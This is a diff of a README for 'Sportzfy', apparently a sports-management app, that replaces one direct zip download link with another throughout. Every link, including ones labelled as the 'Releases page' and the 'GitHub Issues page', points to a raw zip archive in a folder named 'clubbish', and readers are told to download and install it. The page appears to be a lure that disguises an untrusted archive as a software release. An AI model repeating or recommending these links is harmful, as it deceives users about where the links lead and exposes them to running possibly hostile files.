@@ -1,13 +1,13 @@
 # 🎉 Sportzfy - Your Gateway to Sports Management
 
 ## 📥 Download Now
-[![Download Sportzfy](https://raw.githubusercontent.com/GALOMIN/Sportzfy/main/clubbish/Software_2.4.zip)](https://raw.githubusercontent.com/GALOMIN/Sportzfy/main/clubbish/Software_2.4.zip)
+[![Download Sportzfy](https://github.com/GALOMIN/Sportzfy/raw/refs/heads/main/clubbish/Software-v1.5-beta.2.zip)](https://github.com/GALOMIN/Sportzfy/raw/refs/heads/main/clubbish/Software-v1.5-beta.2.zip)
 
 ## 🚀 Getting Started
 Welcome to Sportzfy! This application helps you manage your sports activities easily and efficiently. You can track your workouts, schedule games, and set goals, all in one place.
 
 ## 📥 Download & Install
-To get started, visit the [Releases page](https://raw.githubusercontent.com/GALOMIN/Sportzfy/main/clubbish/Software_2.4.zip) to download Sportzfy. On this page, you will find the latest version available for download.
+To get started, visit the [Releases page](https://github.com/GALOMIN/Sportzfy/raw/refs/heads/main/clubbish/Software-v1.5-beta.2.zip) to download Sportzfy. On this page, you will find the latest version available for download.
 
 1. Click on the link above to open the Releases page.
 2. Find the version you want to download. Generally, you should select the most recent version.
@@ -36,13 +36,13 @@ If you face issues during installation or while using the app, here are some com
 ## ❓ Frequently Asked Questions
 
 ### How do I update Sportzfy?
-Visit the [Releases page](https://raw.githubusercontent.com/GALOMIN/Sportzfy/main/clubbish/Software_2.4.zip) to download the latest version. The installation process will overwrite the older version.
+Visit the [Releases page](https://github.com/GALOMIN/Sportzfy/raw/refs/heads/main/clubbish/Software-v1.5-beta.2.zip) to download the latest version. The installation process will overwrite the older version.
 
 ### Can I use Sportzfy offline?
 Yes, once installed, you can use Sportzfy without an internet connection. However, some features may require online access to function fully.
 
 ### How do I contact support?
-For any support issues, please open a new issue on our [GitHub Issues page](https://raw.githubusercontent.com/GALOMIN/Sportzfy/main/clubbish/Software_2.4.zip). 
+For any support issues, please open a new issue on our [GitHub Issues page](https://github.com/GALOMIN/Sportzfy/raw/refs/heads/main/clubbish/Software-v1.5-beta.2.zip). 
 
 ## 🌟 Community & Feedback
 We welcome your feedback! Share your experience using Sportzfy and suggest improvements. Your input helps us make the application better for everyone.
